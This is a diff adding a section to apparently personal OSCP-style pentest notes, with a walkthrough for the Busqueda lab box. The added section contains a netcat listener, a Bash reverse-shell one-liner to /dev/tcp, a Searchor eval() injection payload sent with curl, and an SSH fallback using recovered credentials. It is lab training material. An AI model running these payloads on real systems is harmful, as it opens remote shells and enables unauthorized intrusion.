@@ -125,6 +125,32 @@ python3 $BoxDir/loot/$Exploit.py $BoxIP $Port
 - [ ] A callback arrives from a custom PE service → **Run `id`, then go to Step 12 · [[Linux - Shell Stabilise]]**
 - [ ] The service crashes with no callback → **Reset the service or box, verify the callback address and bad characters offline, then retry once**
 - [ ] The service is root-owned and exposed after foothold → **Run `ss -lntp` from the shell, retrieve the binary, and repeat Step 10 · [[Linux - Exploit Search]]**
+
+## Searchor reflected RCE and SSH fallback
+
+After the Searchor `eval()` identity proof, reuse the same query boundary for a Bash callback. Prepare the listener before sending the request and keep the command in a variable so the application sees one stable Python expression.
+
+Terminal 1:
+
+```bash
+nc -lvnp "$Lport"
+```
+
+Terminal 2:
+
+```bash
+boxset Callback "bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'"
+boxset SearchorPayload "test'),__import__('os').system('$Callback')#"
+curl --max-time 10 -fsS -G "http://$FQDN:$WebPort/" \
+  --data-urlencode "engine=Accuweather" \
+  --data-urlencode "query=$SearchorPayload" >/dev/null
+```
+
+Run `id`, `whoami`, and `hostname` as soon as the callback arrives. If direct callbacks are unreliable, use the credential recovered from the application repository for one controlled SSH connection, then continue with [[Linux - Shell Stabilise]] or [[Linux - Local Enum]]. A stable SSH session is a valid transition from reflected RCE when the same account is confirmed.
+
+> [!warning] 💡
+> A response proving code execution and a callback arriving are separate tests. Preserve the positive response, check listener state and egress, then use the SSH fallback rather than repeatedly changing the working injection.
+
 ## Seen in
 - [[OSCP/BOXES/WRITE UPS/Linux/CronOS|CronOS]] -- authenticated command injection was verified with id before a Bash callback
 - [[OSCP/BOXES/WRITE UPS/Linux/Bratarina|Bratarina]] -- confirmed in the box write-up
@@ -143,6 +169,7 @@ python3 $BoxDir/loot/$Exploit.py $BoxIP $Port
 - [[OSCP/BOXES/WRITE UPS/Linux/SolidState|SolidState]] -- authenticated James file write placed a login-triggered callback in `/etc/bash_completion.d`
 - [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] -- PHP `User-Agentt` command execution was proved with `id` before a Bash callback
 - [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- OpenAM command execution was proved as `openam` before the application-configuration pivot
+- [[OSCP/BOXES/WRITE UPS/Linux/Busqueda|Busqueda]] -- Searchor response execution was proved first, then a stable SSH session was used for local enumeration
 
 ## PHP 8.1.0-dev `User-Agentt` callback
 
